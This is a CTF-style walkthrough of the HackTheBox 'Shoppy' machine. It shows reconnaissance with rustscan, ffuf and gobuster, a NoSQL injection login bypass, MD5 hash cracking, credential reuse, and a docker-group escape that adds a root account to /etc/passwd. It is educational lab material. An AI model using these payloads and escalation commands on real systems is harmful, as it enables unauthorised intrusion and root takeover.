# Shoppy

## Introduction

Welcome to my another writeup! In this HackTheBox [Shoppy](https://app.hackthebox.com/machines/Shoppy) machine, you'll learn: NoSQL injection, docker escape! Without further ado, let's dive in.

## Background

> Difficulty: Easy

- Overall difficulty for me: Medium
    - Initial foothold: Medium
    - Privilege escalation: Easy

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/Shoppy]
└─# export RHOSTS=10.10.11.180 
                                                                                                           
┌──(root🌸siunam)-[~/ctf/htb/Machines/Shoppy]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDApZi3Kltv1yDHTatw6pKZfuIcoHfTnVe0W1yc9Uw7NMUinxjjQaQ731J+eCTwd8hBcZT6HQwcchDNR50Lwyp2a/KpXuH2my+2/tDvISTRTgwfMy1sDrG3+KPEzBag07m7ycshp8KhrRq0faHPrEgcagkb5T8mnT6zr3YonzoMyIpT+Q1O0JAre6GPgJc9im/tjaqhwUxCH5MxJCKQxaUf2SlGjRCH5/xEkNO20BEUYokjoAWwHUWjK2mlIrBQfd4/lcUzMnc5WT9pVBqQBw+/7LbFRyH4TLmGT9PPEr8D8iygWYpuG7WFOZlU8oOhO0+uBqZFgJFFOevq+42q42BvYYR/z+mFox+Q2lz7viSCV7nBMdcWto6USWLrx1AkVXNGeuRjr3l0r/698sQjDy5v0GnU9cMHeYkMc+TuiIaJJ5oRrSg/x53Xin1UogTnTaKLNdGkgynMqyVFklvdnUngRSLsXnwYNgcDrUhXxsfpDu8HVnzerT3q27679+n5ZFM=
|   256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHiKrH/B/4murRCo5ju2KuPgkMjQN3Foh7EifMHEOwmoDNjLYBfoAFKgBnrMA9GzA+NGhHVa6L8CAxN3eaGXXMo=
|   256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBRsWhJQCRHjDkHy3HkFLMZoGqCmM3/VfMHMm56u0Ivk
80/tcp   open  http     syn-ack ttl 63 nginx 1.23.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://shoppy.htb
|_http-server-header: nginx/1.23.1
9093/tcp open  copycat? syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/plain; version=0.0.4; charset=utf-8
|     Date: Sat, 15 Oct 2022 06:26:09 GMT
|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
|     TYPE go_gc_cycles_automatic_gc_cycles_total counter
|     go_gc_cycles_automatic_gc_cycles_total 4986
|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
|     TYPE go_gc_cycles_forced_gc_cycles_total counter
|     go_gc_cycles_forced_gc_cycles_total 0
|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
|     TYPE go_gc_cycles_total_gc_cycles_total counter
|     go_gc_cycles_total_gc_cycles_total 4986
|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
|     TYPE go_gc_duration_seconds summary
|     go_gc_duration_seconds{quantile="0"} 5.4612e-05
|_    go_gc_duration_seconds{quantile="0.25"} 9.7674e-05
[...]
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` and `nmap` result, we have 3 ports are opened:

Ports Open                                        | Service
--------------------------------------------------|------------------------
22                                                | OpenSSH 8.4p1 Debian
80                                                | nginx 1.23.1
9093                                              | HTTP??

### HTTP on Port 9093

**In the above `nmap`'s `http-title`, it says `Did not follow redirect to http://shoppy.htb`, let's add that domain to `/etc/hosts`:**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/Shoppy]
└─# echo "$RHOSTS shoppy.htb" | tee -a /etc/hosts
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Shoppy/images/a4.png)

Hmm... **Let's google those outputs.**

After some goolging, I found that this is the `Promscale`, which is a unified metric and trace observability backend for Prometheus, Jaeger and OpenTelemetry built on PostgreSQL and TimescaleDB.

- `Promscale` GitHub repository: https://github.com/timescale/promscale

Also, in their [GitHub repository](https://github.com/timescale/promscale/blob/master/docs/metrics.md), Promscale exposes Prometheus metrics at `/metrics` endpoint by default or as configured in `-web.telemetry-path`. It is recommended that you monitor your Promscale instances with Prometheus.

Hmm... I don't see anything I can do with this. Let's go back.

### HTTP on Port 80

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Shoppy/images/a1.png)

**Since this host has a domain in HTTP, we can fuzz the subdomain via `ffuf`:**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/Shoppy]
└─# ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://shoppy.htb/ -H "Host: FUZZ.shoppy.htb" -fs 169 -t 100 
[...]
mattermost              [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 192ms]
```

**Let's add that subdomain to `/etc/hosts`!**
```
10.10.11.180 shoppy.htb mattermost.shoppy.htb
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Shoppy/images/a5.png)

I tried to do login bypass via SQL injection and guessing the credentials, but no luck.

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Shoppy/images/a6.png)

Take a step back again.

**Let's enumerate hidden directory via `gobuster` in `shoppy.htb`!**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/Shoppy]
└─# gobuster dir -u http://shoppy.htb/ -w /usr/share/wordlists/dirb/common.txt -t 100 -r
[...]
/admin                (Status: 200) [Size: 1074]
/Admin                (Status: 200) [Size: 1074]
/ADMIN                (Status: 200) [Size: 1074]
/favicon.ico          (Status: 200) [Size: 213054]
/login                (Status: 200) [Size: 1074]
/Login                (Status: 200) [Size: 1074]
```

- Found directories: `admin` , `/login`

**When I reach to `/admin`, it redirects me to `/login`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Shoppy/images/a2.png)

**When I tried to do a login bypass via SQL injection, some weird behavior happened:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Shoppy/images/a3.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Shoppy/images/a7.png)

**504 Gateway Time-out?**

Now, I suspect that it's using **NoSQL**, perhaps like MongoDB.

**We can try a NoSQL authentication bypass payload:**
```sql
admin' || '1==1
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Shoppy/images/a8.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Shoppy/images/a9.png)

I'm in!

## Initial Foothold

**In here, I can search users.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Shoppy/images/a10.png)

**What if the search query is vulnerable to NoSQL injection?**
```sql
' || '1==1
```

This will returns a `True` boolean value.

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Shoppy/images/a11.png)

It has a `Download export` button!

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Shoppy/images/a12.png)

Found user `josh` hashed password!

Let's crack that!

If we copy and paste that hash into `hash-identifier`, it outputs that **it's a MD5 hash**!

```
┌──(root🌸siunam)-[~/ctf/htb/Machines/Shoppy]
└─# hash-identifier   
[...]
 HASH: {Redacted}

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

**Armed with this information, we can crack this hash via `john`:**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/Shoppy]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 josh.hash
[...]
{Redacted} (josh)
```

Cracked!

**Since this machine has SSH opened, I'll try to login as `josh` in SSH:**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/Shoppy]
└─# ssh josh@$RHOSTS
josh@10.10.11.180's password: 
Permission denied, please try again.
```

Hmm... Not a correct password for `josh` in SSH.

Ok, let's go back. **How about the `mattermost` subdomain's login page?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Shoppy/images/a13.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Shoppy/images/a14.png)

I'm inside `josh` MatterMost account!

**After digging deeper, the `Deploy Machine` has a credentials!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Shoppy/images/a15.png)

**Hmm... This looks like is referring to the SSH port! Let's login as `jager`!**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/Shoppy]
└─# ssh jaeger@$RHOSTS
jaeger@10.10.11.180's password: 
[...]
jaeger@shoppy:~$ whoami;hostname;id;ip a
jaeger
shoppy
uid=1000(jaeger) gid=1000(jaeger) groups=1000(jaeger)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:58:78 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.10.11.180/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:5878/64 scope global dynamic mngtmpaddr 
       valid_lft 86399sec preferred_lft 14399sec
    inet6 fe80::250:56ff:feb9:5878/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:a1:bb:17:d2 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:a1ff:febb:17d2/64 scope link 
       valid_lft forever preferred_lft forever
```

**I'm user `jaeger`!**

**user.txt:**
```
jaeger@shoppy:~$ cat /home/jaeger/user.txt 
{Redacted}
```

## Privilege Escalation

### jaeger to deploy

**Sudo permission:**
```
jaeger@shoppy:~$ sudo -l
[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```

**We can run `/home/deploy/password-manager` as user `deploy`!**

Let's take a look at that file:

```
jaeger@shoppy:~$ file /home/deploy/password-manager
/home/deploy/password-manager: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=400b2ed9d2b4121f9991060f343348080d2905d1, for GNU/Linux 3.2.0, not stripped

jaeger@shoppy:~$ ls -lah /home/deploy/password-manager
-rwxr--r-- 1 deploy deploy 19K Jul 22 13:20 /home/deploy/password-manager
```

It's a **ELF 64-bit LSB executable**, and it's owned by user `deploy`.

**We can use `strings` to find all the string inside that executable:**
```
jaeger@shoppy:~$ strings /home/deploy/password-manager
[...]
Welcome to Josh password manager!
Please enter your master password: 
Access granted! Here is creds !
cat /home/deploy/creds.txt
Access denied! This incident will be reported !
[...]
```

**When this executable runs, it'll ask our master password. If the master password is correct, than `cat` the `/home/deploy/creds.txt` file.**

```
jaeger@shoppy:~$ ls -lah /home/deploy
-rw------- 1 deploy deploy   56 Jul 22 13:15 creds.txt
```

However, this `creds.txt` is owned by `deploy`, and **only has read/write access for the owner**.

**I tried to use all the password that we've found, but no dice:**
```
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: {Redacted}
Access denied! This incident will be reported !

jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: {Redacted}
Access denied! This incident will be reported !
```

**Let's transfer this executable to our attacker machine for reverse engineering!**
```
jaeger@shoppy:~$ cd /home/deploy/
jaeger@shoppy:/home/deploy$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...

┌──(root🌸siunam)-[~/ctf/htb/Machines/Shoppy]
└─# wget http://$RHOSTS:1337/password-manager;chmod +x password-manager
```

**I'll use `Ghidra` to do it:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Shoppy/images/a16.png)

**In the `main` function, the `local_68` variable is storing the master password!**

**Let's use the `password-manager` executable to find other credentials!**
```
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: {Redacted}
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: {Redacted}
```

Now, we can **Switch User** to `deploy`!

```
jaeger@shoppy:~$ su deploy
Password: 

$ python3 -c "import pty;pty.spawn('/bin/bash')"
deploy@shoppy:/home/jaeger$ whoami;hostname;id
deploy
shoppy
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```

I'm user `deploy`!

**password-manager source code:**(`/home/deploy/password-manager.cpp`)
```cpp
#include <iostream>
#include <string>

int main() {
    std::cout << "Welcome to Josh password manager!" << std::endl;
    std::cout << "Please enter your master password: ";
    std::string password;
    std::cin >> password;
    std::string master_password = "";
    master_password += "{Redacted}";
    master_password += "{Redacted}";
    master_password += "{Redacted}";
    master_password += "{Redacted}";
    master_password += "{Redacted}";
    master_password += "{Redacted}";
    if (password.compare(master_password) == 0) {
        std::cout << "Access granted! Here is creds !" << std::endl;
        system("cat /home/deploy/creds.txt");
        return 0;
    } else {
        std::cout << "Access denied! This incident will be reported !" << std::endl;
        return 1;
    }
}
```

### deploy to root

**In the `id` output, we can see that the `deploy` user is inside the `docker` group!**
```
deploy@shoppy:~$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```

**Let's enumerate the docker!**
```
deploy@shoppy:~$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
alpine       latest    d7d3d98c851f   2 months ago   5.53MB
```

It has an `alpine` image!

**How about we spin up the `alpine` image with root privilege, and add a new user to the host?**
```
deploy@shoppy:~$ docker run -it -v /:/host/ alpine:latest chroot /host/ bash

root@00ce009acacb:/# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
48: eth0@if49: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

> Note: You can read the root flag from here, but you're inside the docker container, it's not the real root.

- Generate a password for `passwd`:

```
┌──(root🌸siunam)-[~/ctf/htb/Machines/Shoppy]
└─# openssl passwd password
$1$vFvyuJKr$hY/SAnQcnw55YvCSyB53n1
```

- Adding a new user with root privilege:

```
root@00ce009acacb:/# echo "pwned:\$1\$vFvyuJKr\$hY/SAnQcnw55YvCSyB53n1:0:0:root:/root:/bin/bash" >> /etc/passwd
root@00ce009acacb:/# exit
```

- Switch User to newly created user:

```
deploy@shoppy:~$ su pwned
Password:

root@shoppy:/home/deploy# whoami;hostname;id;ip a
root
shoppy
uid=0(root) gid=0(root) groups=0(root)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:58:78 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.10.11.180/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:5878/64 scope global dynamic mngtmpaddr 
       valid_lft 86400sec preferred_lft 14400sec
    inet6 fe80::250:56ff:feb9:5878/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:a1:bb:17:d2 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:a1ff:febb:17d2/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

## Rooted

**root.txt:**
```
root@shoppy:/home/deploy# cat /root/root.txt 
{Redacted}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Shoppy/images/a17.png)

# Conclusion

What we've learned:

1. Subdomain Enumeration
2. Directory Enumeration
3. Authentication Bypass via NoSQL Injection
4. Hash Cracking
5. Reverse Engineering 64-Bit LSB Executable via Ghidra
6. Privilege Escalation via Docker Escape